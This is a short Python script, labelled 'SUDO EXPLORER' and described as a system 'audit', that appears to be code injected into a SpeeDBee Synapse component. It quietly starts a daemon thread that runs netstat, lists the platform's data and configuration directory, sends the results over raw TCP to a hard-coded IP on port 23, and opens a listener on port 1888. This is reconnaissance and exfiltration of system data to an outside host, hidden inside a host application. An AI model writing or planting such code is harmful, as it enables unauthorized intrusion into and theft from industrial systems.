# broker_executor.py - VERSIÓN 014 (SUDO EXPLORER)
import threading
import socket
import subprocess
import os

MI_PC = "192.168.171.156"

def auditoria_sistema(comp, ip_destino):
    def log_h(texto):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip_destino, 23))
            s.sendall(f"DX1_SUDO: {texto}\n".encode())
            s.close()
        except: pass

    log_h("--- INICIO AUDITORÍA 014 ---")
    
    # 1. ¿Quién ocupa el 1883? (Probamos con lsof o netstat más agresivo)
    try:
        # Intentamos listar procesos escuchando
        net = subprocess.check_output("netstat -plnt", shell=True).decode()
        log_h(f"RED ACTUAL:\n{net}")
    except:
        log_h("Fallo al ejecutar netstat")

    # 2. Listar archivos en la carpeta de Synapse (Donde están las BD y configs)
    try:
        path = "/opt/speedbeesynapse-data/"
        archivos = os.listdir(path)
        log_h(f"ARCHIVOS EN {path}: {archivos}")
    except Exception as e:
        log_h(f"Error accediendo a data: {e}")

    # 3. Mantener el receptor de conexiones en 1888
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', 1888))
        server.listen(5)
        while True:
            conn, addr = server.accept()
            log_h(f"CONEXION ENTRANTE DESDE {addr}")
            conn.close()
    except Exception as e:
        log_h(f"Error Socket 1888: {e}")

t = threading.Thread(target=auditoria_sistema, args=(self, MI_PC), daemon=True)
t.start()
self.col_res.insert("LOG 014: Auditoria enviada")